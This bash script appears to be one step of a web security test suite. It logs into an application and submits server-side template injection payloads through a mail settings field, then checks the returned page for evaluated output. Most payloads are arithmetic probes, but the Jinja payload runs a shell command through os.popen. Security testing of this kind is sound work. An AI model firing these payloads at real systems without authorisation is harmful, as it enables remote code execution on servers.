#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed
setup_run_dir "38-ssti-settings"

perform_login cookies.txt login.headers login.body.html
cat > payloads.txt <<'EOF'
mustache|WSTGSSTI1-{{7*7}}
jinja|WSTGSSTI2-{{ cycler.__init__.__globals__.os.popen("id").read() }}
erb|WSTGSSTI3-<%= 7*7 %>
freemarker|WSTGSSTI4-${7*7}
thymeleaf|WSTGSSTI5-[[${7*7}]]
EOF
while IFS='|' read -r label payload; do
  fetch_get "${SETTINGS_PATH}" settings-pre.html settings-pre.headers cookies.txt
  csrf="$(extract_first_csrf settings-pre.html)"
  fetch_post_form "${SETTINGS_PATH}" "${label}-post.html" "${label}-post.headers" cookies.txt "${SETTINGS_PATH}" \
    --data-urlencode "csrf_token=${csrf}" \
    --data-urlencode 'html_display_preference=prefer_sanitized_html' \
    --data-urlencode "archive_mailbox_name=${payload}"
  fetch_get "${SETTINGS_PATH}" "${label}-after.html" "${label}-after.headers" cookies.txt
  printf '\n===== %s =====\npayload=%s\nhttp=%s\ntitle=%s\n' "$label" "$payload" "$(header_code "${label}-post.headers")" "$(html_title "${label}-after.html")"
  grep -Ein 'WSTGSSTI[1-5]|49|uid=|gid=' "${label}-after.html" | sed -n '1,60p'
done < payloads.txt

printf '\nSaved in %s\n' "$RUN_DIR"
